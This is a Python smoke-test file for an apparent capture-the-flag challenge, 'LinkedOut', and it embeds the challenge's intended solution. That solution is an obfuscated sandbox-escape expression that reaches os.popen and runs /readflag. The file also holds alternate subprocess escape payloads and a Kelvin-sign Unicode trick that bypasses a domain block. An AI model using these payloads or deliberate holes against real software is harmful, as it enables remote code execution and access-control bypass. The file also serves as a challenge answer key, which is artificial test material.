import os
from pathlib import Path
import sqlite3
import sys

import jinja2

ROOT = Path(__file__).resolve().parent
for candidate in (ROOT / "src", Path("/app")):
    if (candidate / "app.py").exists():
        sys.path.insert(0, str(candidate))
        break

os.environ.setdefault("LINKEDOUT_DB_PATH", "/tmp/linkedout-smoke.db")

import app as linkedout_app
from lib import admin_models, recruiter_labs


CANONICAL_READFLAG_EXPR = "".join(
    [
        "[[out]",
        "for[x]in[[profile]]",
        "for[x.__typing_subst__]in[[[].__class__.__class__.__subclasses__]]",
        "for[q]in[[].__class__[x][[].__class__.__base__].__args__]",
        "for[x.__typing_subst__]in[[[].__class__.__len__]]",
        "for[one]in[[].__class__[x][[q]].__args__]",
        "for[x.__typing_subst__]in[[one.__add__]]",
        "for[two]in[[].__class__[x][one].__args__]",
        "for[three]in[[].__class__[x][two].__args__]",
        "for[x.__typing_subst__]in[[two.__add__]]",
        "for[four]in[[].__class__[x][two].__args__]",
        "for[x.__typing_subst__]in[[one.__class__.__neg__]]",
        "for[neg_one]in[[].__class__[x][one].__args__]",
        "for[x.__typing_subst__]in[[two.__class__.__neg__]]",
        "for[neg_two]in[[].__class__[x][two].__args__]",
        "for[w]in[[q[neg_two].__init__.__globals__]]",
        "for[u]in[[].__class__.__base__.__subclasses__.__name__[not[[]]]]",
        "for[o]in[[].__class__.__base__.__name__[not[[]]]]",
        "for[s]in[[].__class__.__name__[two]]",
        "for[r]in[[one.__class__.__radd__.__name__[two]]]",
        "for[e]in[[one.__class__.__neg__.__name__[three]]]",
        "for[a]in[[one.__class__.__add__.__name__[two]]]",
        "for[d]in[[one.__class__.__add__.__name__[three]]]",
        "for[f]in[[x.__format__.__name__[two]]]",
        "for[l]in[[].__class__.__name__[not[[]]]]",
        "for[i]in[[].__class__.__name__[one]]",
        "for[g]in[[one.__class__.__neg__.__name__[four]]]",
        "for[x.__typing_subst__]in[[o.__add__]]",
        "for[osstr]in[[].__class__[x][s].__args__]",
        "for[x.__typing_subst__]in[[u.__add__]]",
        "for[du]in[[].__class__[x][u].__args__]",
        "for[x.__typing_subst__]in[[f.__add__]]",
        "for[fi]in[[].__class__[x][i].__args__]",
        "for[x.__typing_subst__]in[[fi.__add__]]",
        "for[fil]in[[].__class__[x][l].__args__]",
        "for[x.__typing_subst__]in[[fil.__add__]]",
        "for[file]in[[].__class__[x][e].__args__]",
        "for[x.__typing_subst__]in[[du.__add__]]",
        "for[dufile]in[[].__class__[x][file].__args__]",
        "for[x.__typing_subst__]in[[dufile.__add__]]",
        "for[filekey]in[[].__class__[x][du].__args__]",
        "for[slash]in[[w[filekey][not[[]]]]]",
        "for[x.__typing_subst__]in[[r.__add__]]",
        "for[re]in[[].__class__[x][e].__args__]",
        "for[x.__typing_subst__]in[[re.__add__]]",
        "for[rea]in[[].__class__[x][a].__args__]",
        "for[x.__typing_subst__]in[[rea.__add__]]",
        "for[read]in[[].__class__[x][d].__args__]",
        "for[x.__typing_subst__]in[[read.__add__]]",
        "for[readf]in[[].__class__[x][f].__args__]",
        "for[x.__typing_subst__]in[[readf.__add__]]",
        "for[readfl]in[[].__class__[x][l].__args__]",
        "for[x.__typing_subst__]in[[readfl.__add__]]",
        "for[readfla]in[[].__class__[x][a].__args__]",
        "for[x.__typing_subst__]in[[readfla.__add__]]",
        "for[readflagcmd]in[[].__class__[x][g].__args__]",
        "for[x.__typing_subst__]in[[slash.__add__]]",
        "for[cmd]in[[].__class__[x][readflagcmd].__args__]",
        "for[x.__typing_subst__]in[[w[osstr].popen]]",
        "for[pipe]in[[].__class__[x][cmd].__args__]",
        "for[x.__typing_subst__]in[[pipe.read]]",
        "for[out]in[[].__class__[x][neg_one].__args__]",
        "]",
    ]
)
INTENDED_READFLAG_EXPR = CANONICAL_READFLAG_EXPR
OLD_GENERIC_ROUTE_EXPR = "[].__class__[profile.__class__[readflag]]"
ALT_CLASS_GETITEM_EXPR = (
    "[subprocess.check_output.__globals__[subprocess.run.__code__.co_names[[not[]][not[[]]]"
    "+[not[]][not[[]]]+[not[]][not[[]]]]][readflag] for "
    "subprocess.check_output.__globals__[subprocess.run.__code__.co_names[[not[]][not[[]]]"
    "+[not[]][not[[]]]+[not[]][not[[]]]]].__class_getitem__ "
    "in [subprocess.check_output]]"
)
ALT_ALL_POPEN_EXPR = (
    "[subprocess.__dict__[subprocess.__all__[not[[]]]][readflag]"
    "for[subprocess.__dict__[subprocess.__all__[not[[]]]].__class_getitem__]"
    "in[[subprocess.check_output]]]"
)
ALT_REPORTED_WRAPPER_EXPR = (
    "[subprocess.check_output.__class__[readflag]"
    "for[subprocess.check_output.__class__.__class_getitem__]"
    "in[[subprocess.check_output.__call__]]]"
)


def assert_status(resp, status):
    assert resp.status_code == status, f"expected {status}, got {resp.status_code}"


def reset_db():
    if linkedout_app.DB_PATH.exists():
        linkedout_app.DB_PATH.unlink()
    linkedout_app.init_db()


def register(client, email, password):
    return client.post(
        "/register",
        data={"email": email, "password": password},
        follow_redirects=False,
    )


def login(client, email, password):
    return client.post(
        "/login",
        data={"email": email, "password": password},
        follow_redirects=False,
    )


def docker_service_has_path(service, path):
    import subprocess

    result = subprocess.run(
        ["docker", "compose", "exec", "-T", service, "test", "-e", path],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
        check=False,
    )
    return result.returncode == 0


def check_flag_isolation():
    role = os.environ.get("SERVICE_ROLE")
    if role == "web":
        import subprocess

        assert os.path.exists("/flag") is True
        assert os.path.exists("/readflag") is True
        result = subprocess.run(
            ["su", "ctf", "-s", "/bin/sh", "-c", "test ! -r /flag && /readflag"],
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            check=False,
        )
        assert result.returncode == 0
        assert result.stdout.startswith(b"AIS3{")
        return
    if role == "renderer":
        assert os.path.exists("/flag") is False
        assert os.path.exists("/app/flag.txt") is False
        assert os.path.exists("/readflag") is False
        return

    assert docker_service_has_path("web", "/flag") is True
    assert docker_service_has_path("web", "/readflag") is True
    assert docker_service_has_path("renderer", "/flag") is False
    assert docker_service_has_path("renderer", "/app/flag.txt") is False
    assert docker_service_has_path("renderer", "/readflag") is False


def main():
    assert jinja2.__version__ == "3.1.5"
    assert "lin\u212Aedout.local".lower() == "linkedout.local"
    assert linkedout_app.app.secret_key != "linkedout-dev-secret"
    workbook = recruiter_labs.candidate_workbook()
    assert recruiter_labs.FORMULA_ALPHABET == "abcdefghijklmnopqrstuvwxyz_.[]"
    assert recruiter_labs.formula_vocabulary(workbook) == set(recruiter_labs.FORMULA_ALPHABET)
    assert not (set(INTENDED_READFLAG_EXPR) - recruiter_labs.formula_vocabulary(workbook))
    assert set("abcdefghijklmnopqrstuvwxyz") <= recruiter_labs.formula_vocabulary(workbook)
    assert ":" not in recruiter_labs.formula_vocabulary(workbook)
    assert set("_.[]") <= recruiter_labs.formula_vocabulary(workbook)
    assert recruiter_labs.normalize_formula(INTENDED_READFLAG_EXPR, workbook) == INTENDED_READFLAG_EXPR
    assert "readflag" not in repr(workbook)
    assert "route" not in repr(workbook).lower()
    profile = recruiter_labs.candidate_profile()
    assert hasattr(profile, "__dict__")
    assert not hasattr(profile.__class__.__init__, "__globals__")
    try:
        recruiter_labs.run_candidate_formula(
            OLD_GENERIC_ROUTE_EXPR,
            {"score": 42, "connections": 313, "profile": profile},
            workbook,
        )
    except NameError:
        pass
    else:
        raise AssertionError("old GenericAlias route payload should not be accepted")
    if os.environ.get("SERVICE_ROLE") == "web":
        value = recruiter_labs.run_candidate_formula(
            INTENDED_READFLAG_EXPR,
            {"score": 42, "connections": 313, "profile": recruiter_labs.candidate_profile()},
            workbook,
        )
        assert "AIS3{" in repr(value)

    with sqlite3.connect(":memory:") as db:
        assert admin_models.public_signup_domain_blocked("linkedout.local", db) is True
        assert admin_models.public_signup_domain_blocked("LinkedOut.local", db) is True
        assert admin_models.public_signup_domain_blocked("linKedout.local", db) is True
        assert admin_models.public_signup_domain_blocked("LINKEDOUT.local", db) is True
        assert admin_models.public_signup_domain_blocked("lin\u212Aedout.local", db) is False

    reset_db()
    linkedout_app.app.config.update(TESTING=True)
    with linkedout_app.app.test_client() as client:
        assert_status(register(client, "blocked@linKedout.local", "12345"), 200)
        assert client.get("/feed").status_code == 302
        assert_status(register(client, "blocked@LINKEDOUT.local", "12345"), 200)
        assert client.get("/feed").status_code == 302
        assert_status(register(client, "test@test.com", "12345"), 302)
        assert_status(login(client, "test@test.com", "12345"), 302)
        app_source = client.get("/media?file=app.py")
        assert_status(app_source, 200)
        assert b"linkedout.local" not in app_source.data
        renderer_source = client.get("/media?file=renderer.py")
        assert_status(renderer_source, 200)
        assert b"ADMIN_SOURCE" not in renderer_source.data
        assert b"linecache" not in renderer_source.data
        assert b"from lib import admin_models" in renderer_source.data
        assert_status(client.get("/media?file=requirements.txt"), 200)
        assert_status(client.get("/media?file=uploads/default.png"), 200)
        assert_status(client.get("/media?file=templates/labs.html"), 404)
        assert_status(client.get("/media?file=lib/templates/recruiter_labs/labs.html"), 404)
        assert_status(client.get("/media?file=lib/admin_models.py"), 404)
        assert_status(client.get("/media?file=lib/recruiter_labs.py"), 404)
        assert_status(client.get("/media?file=../../flag"), 404)
        assert_status(client.get("/media?file=smoke_tests.py"), 404)
        assert_status(client.get("/media?file=linkedout.db"), 404)
        assert_status(client.get("/media?file=Dockerfile"), 404)
        assert_status(client.get("/recruiter/labs"), 403)

    with linkedout_app.app.test_client() as client:
        assert_status(register(client, "attacker@lin\u212Aedout.local", "12345"), 302)
        assert_status(login(client, "attacker@lin\u212Aedout.local", "12345"), 302)
        assert_status(client.get("/recruiter/labs"), 200)
        ranking = client.post("/recruiter/labs", data={"formula": "connections"})
        assert_status(ranking, 200)
        assert b"<pre>313</pre>" in ranking.data
        allowed = client.post("/recruiter/labs", data={"formula": "score"})
        assert_status(allowed, 200)
        assert b"<pre>42</pre>" in allowed.data
        profile_signal = client.post("/recruiter/labs", data={"formula": "profile.location"})
        assert_status(profile_signal, 200)
        assert b"<pre>&#39;Local office&#39;</pre>" in profile_signal.data
        no_runner = client.post("/recruiter/labs", data={"formula": "subprocess"})
        assert_status(no_runner, 200)
        assert b"formula error: NameError" in no_runner.data
        old_route = client.post("/recruiter/labs", data={"formula": OLD_GENERIC_ROUTE_EXPR})
        assert_status(old_route, 200)
        assert b"formula error: NameError" in old_route.data
        assert b"AIS3{" not in old_route.data
        alternate = client.post("/recruiter/labs", data={"formula": ALT_CLASS_GETITEM_EXPR})
        assert_status(alternate, 200)
        assert b"formula error:" in alternate.data
        assert b"AIS3{" not in alternate.data
        all_popen = client.post("/recruiter/labs", data={"formula": ALT_ALL_POPEN_EXPR})
        assert_status(all_popen, 200)
        assert b"formula error:" in all_popen.data
        assert b"AIS3{" not in all_popen.data
        wrapper = client.post("/recruiter/labs", data={"formula": ALT_REPORTED_WRAPPER_EXPR})
        assert_status(wrapper, 200)
        assert b"formula error:" in wrapper.data
        assert b"AIS3{" not in wrapper.data

    if os.environ.get("SKIP_DOCKER_ISOLATION") != "1":
        check_flag_isolation()

    print("smoke tests passed")


if __name__ == "__main__":
    main()
